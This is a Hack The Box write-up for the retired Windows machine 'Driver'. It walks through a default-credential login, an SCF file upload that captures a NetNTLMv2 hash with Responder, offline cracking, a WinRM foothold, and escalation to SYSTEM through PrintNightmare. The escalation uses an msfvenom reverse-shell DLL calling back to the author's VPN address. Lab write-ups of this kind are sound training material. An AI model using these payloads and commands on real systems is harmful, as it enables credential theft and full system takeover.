<p align="center">
  <img src="../assets/branding/nu11s3c-banner.svg" alt="nu11s3c security writeups" width="100%" />
</p>

# driver - hack the box

**platform:** Hack The Box · retired machine  
**os:** Windows 10 · build 10240 (edition and architecture not independently established)  
**outcome:** WinRM foothold as `tony`; reverse shell as `NT AUTHORITY\SYSTEM`  
**focus:** HTTP Basic auth · file uploads · SCF files · NetNTLMv2 · Responder · John the Ripper · Windows enumeration · printer driver ACLs · PrintNightmare

---

## `00 / prep`

prepped engagement structure; fish for environment variables and tmux for logging

```sh
> cat env.fish
# env.fish
set -gx ENGAGEMENT_DIR (pwd -P)
set -gx ENGAGEMENT "driver"
set -gx IP "<TARGET_IP>"

if set -q TMUX
    set -l session (tmux display-message -p '#S')
    tmux set-environment -t "$session" ENGAGEMENT "$ENGAGEMENT"
    tmux set-environment -t "$session" IP "$IP"
    tmux set-environment -t "$session" ENGAGEMENT_DIR "$ENGAGEMENT_DIR"
end

> . env.fish
[no output]

> tree
.
├── env.fish
├── logs
│   └── tmux
│       ├── s0-p0-20261122T195154-IEaUSf.log
│       └── s0-p31-20261122T195154-lOXyNI.log
├── loot
├── notes
│   └── notes.md
└── scans

6 directories, 4 files
```


---

## `01 / recon`

### service discovery

began with the usual nmap scans

```sh
> nmap -sVC -oA scans/initial $IP
80/tcp   open  http         Microsoft IIS httpd 10.0
135/tcp  open  msrpc        Microsoft Windows RPC
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0

Service Info: Host: DRIVER; OS: Windows

> nmap -Pn -p- --min-rate 1000 -oA scans/allports $IP
Not shown: 65534 filtered tcp ports (no-response)
PORT     STATE SERVICE
5985/tcp open  wsman

> nmap -sUV --top-ports 100 -oA scans/udp $IP
All 100 scanned ports on driver.htb (<TARGET_IP>) are in ignored states.
```

| port | service | observation |
| ---: | --- | --- |
| 80 | HTTP | IIS 10.0, Basic authentication |
| 135 | MSRPC | RPC endpoint mapper |
| 445 | SMB | SMB2 signing enabled but not required |
| 5985 | WinRM | possible foothold if I find creds |

the full TCP scan only returned 5985 for some reason, and top 100 UDP returned nothing

### web

visited port 80, was greeted by a Basic auth prompt. checked the response in Burp

```http
HTTP/1.1 401 Unauthorized
Server: Microsoft-IIS/10.0
X-Powered-By: PHP/7.3.25
WWW-Authenticate: Basic realm="MFP Firmware Update Center. Please enter password for admin"
```

the realm gave me the username `admin`. tried the obvious default creds and got in

printer firmware update center. the footer gave me `support@driver.htb`, so added the hostname to `/etc/hosts`

```sh
> echo "$IP    driver.htb" | sudo tee -a /etc/hosts
[HTB_TARGET_IP]    driver.htb

> whatweb http://driver.htb
http://driver.htb [401 Unauthorized] HTTPServer[Microsoft-IIS/10.0], Microsoft-IIS[10.0], PHP[7.3.25], WWW-Authenticate[MFP Firmware Update Center. Please enter password for admin][Basic], X-Powered-By[PHP/7.3.25]
```

confirmed `IIS 10.0` and `PHP 7.3.25`

the firmware updates page had an interesting description

> Select printer model and upload the respective firmware update to our file share. Our testing team will review the uploads manually and initiates the testing soon.

two things stood out, the files were being uploaded to a share and someone was going to be manually reviewing them. checked the page source

### smb and rpc

tried some anonymous smb and rpc enumeration first

```sh
> smbclient --list=driver.htb --no-pass
session setup failed: NT_STATUS_ACCESS_DENIED

> rpcclient -U "" -N $IP -c 'enumdomusers'
Cannot connect to server. Error was NT_STATUS_ACCESS_DENIED
```

no luck there. the file upload was looking more promising


---

## `02 / initial access`

### scf files

started looking at attacks involving SMB shares. I remembered that icons could be requested remotely. using both those concepts, I narrowed it down to this [article on SMB share SCF file attacks](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/)

SCF files can reference an icon on a remote share. the interesting part is Windows Explorer may request that icon just by browsing the directory, attempting to authenticate to the remote server. given the manual review of uploaded files this seemed worth pursuing

prepared a test file and monitored my VPN interface with Responder

```sh
> cat firmware.scf

[Shell]
Command=2
IconFile=\\<VPN_IP>\share\pwn.ico
[Taskbar]
Command=ToggleDesktop
```


```sh
> ip -br addr

# ip -br addr (selected)
tun0   UNKNOWN   [VPN_IP]/23

> sudo responder -I tun0 -v

# Responder (selected)
SMB server                 [ON]
Responder NIC              [tun0]
Responder IP               [VPN_IP]
[+] Listening for events...

# after submitting the file
[SMB] NTLMv2-SSP Client   : [HTB_TARGET_IP]
[SMB] NTLMv2-SSP Username : DRIVER\tony
[SMB] NTLMv2-SSP Hash     : [REDACTED]
```

submitted the file through the firmware page. the original upload POST isn't in my notes; the saved Burp request is the subsequent GET

the upload response returned `msg=SUCCESS`. that by itself didn't prove the file had been processed by a user, but Responder subsequently received an SMB authentication attempt from the target


this was a NetNTLMv2 challenge-response, not Tony's NT hash

### recovering the password and testing winrm

used John and rockyou to recover Tony's password

```sh
> john --wordlist=/usr/share/wordlists/rockyou.txt hash

Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
[REDACTED]          (tony)
1g 0:00:00:00 DONE
Session completed
```

had WinRM on 5985 from my initial scan, tested the creds

```sh
> evil-winrm -i $IP -u tony -p "$TONY_PASS"

Evil-WinRM shell v4.1
Info: Establishing connection to remote endpoint
Info: Connection successful
*Evil-WinRM* PS C:\Users\tony\Documents>
```


---

## `03 / local enumeration`

### user context

```powershell
> whoami /priv

SeShutdownPrivilege
SeChangeNotifyPrivilege
SeUndockPrivilege
SeIncreaseWorkingSetPrivilege
SeTimeZonePrivilege

> whoami /groups

BUILTIN\Remote Management Users
BUILTIN\Users
NT AUTHORITY\Local account
Mandatory Label\Medium Mandatory Level
```

nothing particularly interesting in the privileges. `Remote Management Users` explains the WinRM access

tried enumerating services, access denied

```powershell
> cmd.exe /c sc.exe query

# sc.exe query
[SC] OpenSCManager FAILED 5:
Access is denied.

> Get-Service

# Get-Service
Cannot open Service Control Manager on computer '.'. This operation might require other privileges.
```

moved on to processes, local listeners and the OS version

```powershell
> Get-Process

# Get-Process (selected)
Id    ProcessName
1164  spoolsv
3764  wsmprovhost

> netstat -ano

# netstat -ano (selected)
TCP    0.0.0.0:80      0.0.0.0:0   LISTENING    4
TCP    0.0.0.0:135     0.0.0.0:0   LISTENING    704
TCP    0.0.0.0:445     0.0.0.0:0   LISTENING    4
TCP    0.0.0.0:5985    0.0.0.0:0   LISTENING    4
TCP    0.0.0.0:49410   0.0.0.0:0   LISTENING    1164

> cmd /c ver

# cmd /c ver
Microsoft Windows [Version 10.0.10240]
```

`spoolsv` stood out considering the theme of the box. also a pretty old build of Windows 10

### powershell history

```powershell
> (Get-PSReadLineOption).HistorySavePath

The 'Get-PSReadLineOption' command was found in the module 'PSReadline', but the module could not be loaded.
FullyQualifiedErrorId : CouldNotAutoloadMatchingModule
```

`Get-PSReadLineOption` failed to load the PSReadLine module, so I checked the history files directly instead

```powershell
> foreach($user in ((ls C:\Users).FullName)){
    cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -ErrorAction SilentlyContinue
}

Add-Printer -PrinterName "RICOH_PCL6" -DriverName 'RICOH PCL6 UniversalDriver V4.23' -PortName 'lpt1:'
```

now I had a specific printer driver and version to investigate

---

## `04 / privilege escalation research`

### ricoh driver

found a hidden Ricoh driver directory under `ProgramData`

```powershell
> gci -force C:\ProgramData\RICOH_DRV
d--h--  RICOH PCL6 UniversalDriver V4.23

> icacls C:\ProgramData\RICOH_DRV
C:\ProgramData\RICOH_DRV Everyone:(OI)(CI)(F)
```

Everyone had full control, with inheritance for files and directories. looked for exploits with searchsploit

```sh
> searchsploit "ricoh"

Ricoh Driver - Privilege Escalation (Metasploit)    windows/local/48036.rb
Ricoh Printer Drivers - Local Privilege Escalation windows/local/47962.c
```

spent a fair bit of time going through the C PoC for CVE-2019-19363. it monitors changes in the Ricoh driver directory. needed to understand which files were writable and whether they were being loaded by a privileged process

checked the directory again before looking at the registered driver

```powershell
> icacls c:\programdata\ricoh_drv
c:\programdata\ricoh_drv Everyone:(OI)(CI)(F)

> dir c:\programdata\ricoh_drv
[no output]

> cmd /c dir c:\programdata\ricoh_drv
Directory of c:\programdata\ricoh_drv
File Not Found
```

the normal listings didn't show the hidden directory

```powershell
> gci 'HKLM:\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Drivers' -recurse -erroraction silentlycontinue |
    where-object { $_.PSChildName -match 'RICOH' } | Select-Object Name

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Drivers\Version-3\RICOH PCL6 UniversalDriver V4.23
```

selected values from the driver's registry entry:

```powershell
> get-itemproperty -literalpath 'hklm:\system\currentcontrolset\control\print\environments\windows x64\Drivers\Version-3\RICOH PCL6 UniversalDriver v4.23' |format-list *

Configuration File : ricu0nui.dll
Driver             : ricu0ngr.dll
Manufacturer       : Ricoh
Version            : 3
DriverVersion      : 4.23.0.0
LastServicedBuild  : 10240
```

checked the configuration DLL under the spool driver directory

```powershell
> gci -path C:\Windows\System32\spool\drivers\x64\ -recurse -filter "ricu0nui.dll" -file

Directory: C:\Windows\System32\spool\drivers\x64\3
-a----    6/10/2019  1:17 PM    4557312  ricu0nui.dll

> (get-acl -path c:\windows\system32\spool\drivers\x64).access | format-table -autosize

FileSystemRights            AccessControlType  IdentityReference
FullControl                 Allow              NT AUTHORITY\SYSTEM
FullControl                 Allow              BUILTIN\Administrators
ReadAndExecute, Synchronize Allow              Everyone

> icacls c:\windows\system32\spool\drivers\x64\3\ricu0nui.dll

NT AUTHORITY\SYSTEM:(I)(F)
BUILTIN\Administrators:(I)(F)
Everyone:(I)(RX)
APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
```

Everyone had RX on the DLL in the spool directory, not F like the permissions under ProgramData

went back to `ProgramData` and enumerated the hidden driver directory

```powershell
> dir c:\programdata

d-----   MySQL
d-----   Package Cache
d-----   VMware
<--snip-->

> dir c:\programdata -Force

d--h--   RICOH_DRV
<--snip-->

> icacls c:\programdata\RICOH_DRV
c:\programdata\RICOH_DRV Everyone:(OI)(CI)(F)

> dir C:\ProgramData\RICOH_DRV -Force -Recurse | select fullname, mode, length

# selected paths relative to RICOH_DRV
RICOH PCL6 UniversalDriver V4.23                         d--h--
RICOH PCL6 UniversalDriver V4.23\_common\dlz              d-----
RICOH PCL6 UniversalDriver V4.23\_common\dlz\jobhook.dll   -a---- 2229760
RICOH PCL6 UniversalDriver V4.23\_common\dlz\popup.dll     -a---- 3960832
```

among the contents were a number of DLLs in the driver's `_common\dlz` directory. checked two of the individual DLL ACLs; both `jobhook.dll` and `popup.dll` showed `Everyone:(F)`

```powershell
> icacls "C:\ProgramData\RICOH_DRV\RICOH PCL6 UniversalDriver V4.23\_common\dlz\jobhook.dll"
C:\ProgramData\RICOH_DRV\RICOH PCL6 UniversalDriver V4.23\_common\dlz\jobhook.dll Everyone:(F)

> icacls "C:\ProgramData\RICOH_DRV\RICOH PCL6 UniversalDriver V4.23\_common\dlz\popup.dll"
C:\ProgramData\RICOH_DRV\RICOH PCL6 UniversalDriver V4.23\_common\dlz\popup.dll Everyone:(F)
```


confirmed the weak permissions on the DLLs themselves. spent some time looking through the exploit code from searchsploit and was fairly confident the Metasploit module would work, though I hadn't tested it. wanted to do the box without Metasploit, so I referred to the official walkthrough and went a different route

---

## `05 / print spooler and SYSTEM`

### rpc enumeration

went back to the spooler itself and checked the RPC endpoints. initially supplied only `--target-ip`, which failed because the positional target was missing

```sh
> impacket-rpcdump --target-ip $IP

rpcdump.py: error: the following arguments are required: target
```

passed the IP as the target instead

```sh
> impacket-rpcdump "$IP"

Protocol: [MS-RPRN]: Print System Remote Protocol
Provider: spoolsv.exe
UUID    : 12345678-1234-ABCD-EF00-0123456789AB v1.0
Bindings:
    ncacn_ip_tcp:[HTB_TARGET_IP][49410]
    ncalrpc:[LRPC-...]
```

MS-RPRN was registered under spoolsv. the endpoint itself didn't establish that the host was vulnerable to PrintNightmare

### printnightmare

https://www.thehacker.recipes/ad/movement/print-spooler-service/printnightmare

switched to testing the CVE-2021-1675 PowerShell proof of concept available in Kali's windows-resources. reconnected with Evil-WinRM, uploaded a DLL and loaded the script. the initial upload output showed a destination different from what I intended; the notes don't show the intervening correction

```sh
> msfvenom -p windows/x64/shell_reverse_tcp LHOST=<VPN_IP> LPORT=1337 -f dll -o /tmp/pwn.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of dll file: 9216 bytes
Saved as: pwn.dll
```

```sh
> evil-winrm -i $IP -u tony -p "$TONY_PASS" -e /usr/share/windows-resources/CVE-2021-1675/ -s /usr/share/windows-resources/CVE-2021-1675/

Info: Connection successful
*Evil-WinRM* PS C:\Users\tony\Documents>
```

tried a few different payloads. the generated and uploaded DLL sizes in the excerpts below are from different attempts

```powershell
> upload /tmp/pwn.dll c:\windows\temp\

Info: Uploading /tmp/pwn.dll to C:\Users\tony\Documents\c:windowstemp\
Data: 12288 bytes of 12288 bytes copied
Info: Upload successful!
```


```powershell
> CVE-2021-1675.ps1
[no separate output recorded]

> menu

[+] get_nightmare_dll
[+] Invoke-Nightmare
<--snip-->
```

the script exposed the functions in the Evil-WinRM menu

Penelope was listening on Kali when the callback arrived

```sh
> penelope -p 1337
[listener output not transcribed; subsequent SYSTEM session shown below]
```

when I ran Invoke-Nightmare, the output said that AddPrinterDriverEx failed

```powershell
> invoke-nightmare -dll c:\windows\temp\pwn.dll

[+] using user-supplied payload at c:\windows\temp\pwn.dll
[!] ignoring NewUser and NewPassword arguments
[!] AddPrinterDriverEx failed
FullyQualifiedErrorId : Microsoft.PowerShell.Commands.WriteErrorException,Invoke-Nightmare
```

despite the error, Penelope received a new shell as SYSTEM

```cmd
> whoami
nt authority\system
```

despite the error, `whoami` confirmed SYSTEM

---

## `06 / findings and lessons`

| system / object | method | finding |
| --- | --- | --- |
| HTTP | Basic auth | default credentials accepted |
| firmware application | upload workflow | uploaded file processing associated with outbound SMB authentication |
| NTLM | challenge-response capture and offline password recovery | recovered Tony's password |
| WinRM | credential validation | foothold as Tony |
| PowerShell history | local enumeration | identified the installed Ricoh driver |
| Ricoh driver directory | registry and file ACL inspection | Everyone had full control over individual DLLs; escalation through this path wasn't demonstrated |
| Print Spooler | RPC enumeration and local proof-of-concept test | SYSTEM callback received despite the reported API failure |

spent a fair bit of time on the Ricoh driver. useful exercise in checking permissions, looking through the registry and reading a PoC, even though I ended up going a different route

also a good reminder that the output of an exploit doesn't necessarily tell you whether it worked

---

<sub>nu11s3c</sub>
